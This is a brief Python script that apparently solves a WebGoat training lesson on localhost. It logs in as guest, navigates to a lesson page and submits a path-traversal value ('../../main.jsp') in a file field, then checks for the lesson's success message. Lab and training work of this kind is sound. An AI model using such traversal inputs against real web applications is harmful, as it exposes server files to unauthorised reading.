import requests
import json


#r = requests.Session()
s = requests.Session();


payload = {'password': 'guest', 'username': 'guest'}
#r = requests.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=payload)
r = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data=payload)

#cookies = r.cookie

r = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
resp_dict = json.loads(r.text)
list1 = resp_dict[2]['children']
link = list1[1]['link']
str = 'http://127.0.0.1:8080/WebGoat/' + link
r = s.get(str)
##at the page with vulnerability now

req = {'SUBMIT': 'View+File', 'File': '../../main.jsp'} 

r = s.post(str, data=req)

results = "Congratulations! Access to file allowed" in r.text
print(results)
